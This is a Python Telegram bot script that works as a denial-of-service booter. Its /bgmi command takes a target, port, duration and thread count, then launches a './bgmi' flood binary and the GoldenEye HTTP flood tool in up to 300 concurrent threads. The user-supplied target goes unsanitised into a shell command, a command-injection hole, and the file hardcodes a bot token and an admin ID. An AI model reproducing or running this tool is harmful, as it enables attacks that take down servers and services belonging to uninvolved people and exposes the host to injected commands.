#!/usr/bin/python3

import telebot
import subprocess
import datetime
import os
import threading

# insert your Telegram bot token here
bot = telebot.TeleBot('7333857515:AAGXZEMiDqiNIPuZaQfjRrJRpvjUr6-lgRE')

# Admin user IDs
admin_id = ["6197097362"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time, method, concurrents, status):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    start_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\nMethod: {method}\nConcurrents: {concurrents}\nStatus: {status}\nStart: {start_time}\n\n")

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None, method=None, concurrents=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    if method:
        log_entry += f" | Method: {method}"
    if concurrents:
        log_entry += f" | Concurrents: {concurrents}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, time, method, concurrents):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, ATTACK STARTED.\n\nTarget: {target}\nPort: {port}\nTime: {time} Seconds\nMethod: {method}\nConcurrents: {concurrents}"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME = 300  # Default 5 minutes

# Function to execute the attack in a separate thread
def execute_attack(command):
    subprocess.run(command, shell=True)

# Function to execute multiple DDoS tools concurrently
def execute_multiple_attacks(commands, concurrents):
    threads = []
    for i in range(concurrents):
        for command in commands:
            thread = threading.Thread(target=execute_attack, args=(command,))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 5min Before Running The /bgmi Command Again."
                bot.reply_to(message, response)
                return
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 6:  # Updated to accept target, port, time, method, and concurrents
            target = command[1]
            try:
                port = int(command[2])
                time = int(command[3])
                method = command[4]
                concurrents = int(command[5])
            except ValueError:
                response = "Error: Port, time, and concurrents must be integers."
                bot.reply_to(message, response)
                return

            if time > 5000:
                response = "Error: Time interval must be less than 5000."
            elif concurrents > 300:
                response = "Error: Concurrents must be 300 or less."
            else:
                record_command_logs(user_id, '/bgmi', target, port, time, method, concurrents)
                log_command(user_id, target, port, time, method, concurrents, "Started")
                start_attack_reply(message, target, port, time, method, concurrents)

                # Define commands for both bgmi and an additional DDoS tool (e.g., GoldenEye)
                bgmi_command = f"./bgmi {target} {port} {time} 500"
                goldeneye_command = f"python goldeneye.py {target} -w {time}"
                
                execute_multiple_attacks([bgmi_command, goldeneye_command], concurrents)
                
                response = f"BGMI and GoldenEye Attack Finished. Target: {target} Port: {port} Time: {time} Method: {method} Concurrents: {concurrents}"
                log_command(user_id, target, port, time, method, concurrents, "Finished")
        else:
            response = "Usage: /bgmi <target> <port> <time> <method> <concurrents>"
    else:
        response = "You Are Not Authorized To Use This Command."

    bot.reply_to(message, response)

bot.polling()
